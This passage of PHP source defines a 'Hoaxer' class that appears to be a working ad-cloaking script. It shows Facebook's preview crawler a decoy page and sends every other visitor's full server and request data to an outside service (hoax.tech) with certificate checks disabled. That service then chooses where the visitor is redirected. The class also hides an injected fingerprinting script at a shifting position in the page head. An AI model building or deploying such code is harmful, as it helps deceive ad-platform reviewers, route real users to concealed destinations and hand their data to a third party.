class Hoaxer
{
    public function __construct()
    {
        try {
            if (!function_exists('curl_version')) {
                throw new Exception('php-curl extension does not exist');
            }
            $headers = array_change_key_case(getallheaders());
            if (
                isset($headers['x-purpose']) && $headers['x-purpose'] === 'preview'
                || isset($headers['x-fb-http-engine']) && $headers['x-fb-http-engine'] === 'liger'
                || isset($headers['hoax-curl'])
            ) {
                exit(include 'index2.php');
            }

            $utmFilename = str_replace('.', '_', HOAX_FILENAME);
            if (isset($_GET[$utmFilename])) {
                header('Content-Type: application/javascript; charset=UTF-8');
                exit($this->showMimicAssets());
            }

            if (isset($_POST['hdata'])) {
                $this->responser(
                    $this->utmTransfer(
                        json_decode($this->curlSender('extended', $_POST['hdata']), true)
                    )
                );
            }

            new Redirect(
                $this->utmTransfer(
                    json_decode($this->curlSender('basic', $this->dataCollector()), true)
                ));

            echo $this->appendAssets(HTML::get());
        } catch (Exception $e) {
            $this->responser([$e->getMessage()]);
        }
    }

    private function showMimicAssets()
    {
        session_start();
        return str_replace(
            ['---HOAX_TIME---', '---HOAX_ID---', '---HOAX_FLOW---', '---HOAX_COOKIE---'],
            [$_SESSION[HOAX_FLOW][0], $_SESSION[HOAX_FLOW][1], HOAX_FLOW, HOAX_FLOW],
            $this->assets()
        );
    }

    private function appendAssets(string $html)
    {
        if (!class_exists('DOMDocument')) {
            throw new \Exception('DOM extension is not loaded. Enable it in php.ini');
        }

        libxml_use_internal_errors(true);
        $dom = new \DOMDocument('1.0', 'UTF-8');
        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $head = $dom->getElementsByTagName('head')->item(0);
        if (!$head) {
            throw new \Exception('html markup error: missing <head> tag');
        }

        $hash = crc32($dom->saveHTML($head));

        $script = $dom->createElement('script');
        $script->setAttribute('type', 'text/javascript');
        $script->setAttribute('src', '?' . HOAX_FILENAME . '&route=' . $this->generateRandomValue());

        $lastMeta = null;
        foreach ($head->childNodes as $node) {
            if (strtolower($node->nodeName) === 'meta') {
                $lastMeta = $node;
            }
        }

        $afterNodes = [];
        $current = $lastMeta ? $lastMeta->nextSibling : $head->firstChild;
        while ($current) {
            if ($current->nodeType !== XML_TEXT_NODE || trim($current->textContent) !== '') {
                $afterNodes[] = $current;
            }
            $current = $current->nextSibling;
        }

        if (!empty($afterNodes)) {
            $insertIndex = $hash % count($afterNodes);
            $head->insertBefore($script, $afterNodes[$insertIndex]);
            $head->insertBefore($dom->createTextNode("\n\t"), $afterNodes[$insertIndex]);
        } else {
            $head->appendChild($dom->createTextNode("\n\t"));
            $head->appendChild($script);
        }

        return html_entity_decode($dom->saveHTML(), ENT_QUOTES | ENT_HTML5);
    }


    private function generateRandomValue() 
    {
        switch (rand(1, 5)) {
            case 1: return bin2hex(random_bytes(5));
            case 2: return (string)rand(100000, 999999999); 
            case 3: return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 10); 
            case 4: return uniqid();
            case 5: return (string)time(); 
        }
    }

    private function utmTransfer($response)
    {
        if ($response['status'] === 'ok' && !empty($_GET) && HOAX_UTM === 'true') {
            $parsedUri = parse_url($response['link']);
            $start = (empty($parsedUri['query'])) ? '?' : '&';
            $response['link'] = $response['link'] . $start . http_build_query($_GET);
        }
        return $response;
    }

    private function dataCollector()
    {
        session_start();
        $_SESSION[HOAX_FLOW] = [HOAX_TIME, HOAX_ID];
        $_SERVER['time'] = HOAX_TIME;
        $_SERVER['bhash'] = HOAX_ID;
        $_SERVER['flow_hash'] = HOAX_FLOW;

        array_walk_recursive($_SERVER, function (&$parameter) {
            $parameter = htmlspecialchars($parameter);
        });

        return base64_encode(json_encode($_SERVER));
    }

    private function curlSender($type, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_URL, "https://hoax.tech/api/v2?type=$type");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "data=$data");
        if (!$response = curl_exec($ch)) {
            throw new Exception('cURL error: ' . curl_error($ch));
        }
        curl_close($ch);
        return $response;
    }

    private function responser($response)
    {
        if (is_array($response)) {
            $response = json_encode($response);
        }
        header('Content-Type: application/json; charset=utf-8');
        exit($response);
    }

